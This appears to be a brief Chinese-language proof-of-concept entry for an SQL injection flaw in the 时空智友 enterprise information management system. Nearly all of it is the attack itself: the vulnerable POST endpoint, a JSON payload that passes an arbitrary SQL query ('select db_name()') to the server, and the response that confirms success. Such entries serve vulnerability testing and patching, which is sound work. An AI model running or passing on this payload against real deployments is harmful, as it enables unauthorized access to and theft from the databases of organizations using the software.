# 时空智友企业信息管理系统SQL注入漏洞

时空智友企业信息管理系统 ｜ SQL注入 ｜ —
- **请求**：`POST /formservice?service=workflow.sqlResult HTTP/1.1`

**Payload**
```
{"params": {"a": "1"}, "sql": "select db_name()"}
```
- **响应特征**：200 root